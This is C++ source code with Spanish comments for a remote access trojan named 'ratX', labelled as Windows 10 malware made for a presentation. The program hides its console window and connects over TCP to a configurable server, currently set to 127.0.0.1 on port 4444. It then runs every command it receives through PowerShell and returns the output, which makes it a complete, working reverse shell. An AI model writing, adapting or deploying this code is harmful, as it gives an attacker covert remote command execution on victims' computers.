// ratX - C++ rat (para Windows 10 presentación de malware)
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "ws2_32.lib") // Enlaza la librería Winsock

bool DisableHiddedConsole = false;  // Determina si la consola debe ocultarse
#define SERVER_IP "127.0.0.1" // Dirección IP del servidor
#define PORT 4444 // Puerto donde se conectará al servidor
#define BUFFER_SIZE 8192 // Tamaño del buffer de datos

// Función para ejecutar comandos en PowerShell y capturar la salida
std::string executeCommand(const std::string& command) {
    std::string fullCommand = "powershell -Command \"" + command + "\""; // Ejecuta el comando en PowerShell
    char buffer[BUFFER_SIZE];
    std::string result;
    FILE* pipe = _popen(fullCommand.c_str(), "r"); // Abre un pipe para leer la salida del comando
    if (!pipe) return "Error al ejecutar el comando";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

int main() {
    // Oculta la consola si la opción está activada
    if (!DisableHiddedConsole) {
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
    }

    // Inicializa Winsock
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Crea un socket TCP para conectarse al servidor
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(PORT);

    // Intenta conectarse al servidor
    if (connect(clientSocket, (struct sockaddr*)&server, sizeof(server)) < 0) {
        return 1; // Si la conexión falla, el cliente termina
    }

    char buffer[BUFFER_SIZE];
    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) break; // Si no recibe datos, termina el bucle
        buffer[bytesReceived] = '\0'; // Asegura que el buffer termine en null
        std::string command(buffer);

        // Ejecuta el comando recibido y almacena la salida
        std::string output = executeCommand(command);
        output += "\n[END]"; // Agrega el delimitador de fin de respuesta
        send(clientSocket, output.c_str(), output.length(), 0); // Envía la salida al servidor
    }

    // Cierra el socket y limpia Winsock
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}